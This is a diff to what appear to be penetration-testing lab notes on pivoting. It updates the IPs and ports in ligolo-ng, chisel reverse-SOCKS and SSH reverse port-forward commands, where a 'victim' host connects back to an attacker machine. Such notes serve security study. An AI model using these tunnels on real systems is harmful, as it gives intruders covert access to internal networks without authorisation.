@@ -15,11 +15,11 @@ Lets define some variables for the example:
 - Setup in attack machine:
 	# sudo ip tuntap add user $USER mode tun ligolo
 	# sudo ip link set ligolo up
-	# sudo ip route add 172.16.103.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
+	# sudo ip route add 10.10.93.0/24 dev ligolo (Here we specify that the network route should go through our ligolo device)
 	# ./proxy -selfcert (Note the port from the output: Listening on 0.0.0.0:11601)
 
 - Launch agent in victim machine:
-	# ./agent -connect 192.168.45.156:11601 -ignore-cert
+	# .\agent.exe -connect 192.168.45.193:11601 -ignore-cert
 
 - In ligolo console:
 	# session
@@ -29,7 +29,7 @@ Lets define some variables for the example:
 		If error "bind: permission denied" appear we need to specify another unused port greather than 1000
 
 - To clear everything once we have finished
-	# sudo ip route del 172.16.103.0/24 dev ligolo
+	# sudo ip route del 10.10.93.0/24 dev ligolo
 	# sudo ip link del ligolo
 ```
 
@@ -47,7 +47,7 @@ It is useful when we want to access to the host & multiple ports that cannot be 
 chisel server -p 9999 --reverse
 
 # In remote machine (victim)
-chisel client 10.0.0.1:9999 R:9000:socks
+chisel client 192.168.45.165:9999 R:9000:socks
 
 ```
 
@@ -81,7 +81,7 @@ kali $ sudo systemctl start ssh
 And now we can set up a reverse port forward from the attack machine. Eg: exposing port 60002
 
 ```bash
-www-data@milan:/home$ ssh -R *:60002:localhost:60002 kali@192.168.45.245
+www-data@milan:/home$ ssh -R *:40000:localhost:40000 kali@192.168.45.165
 ```
 
 Now we have access from our kali machine
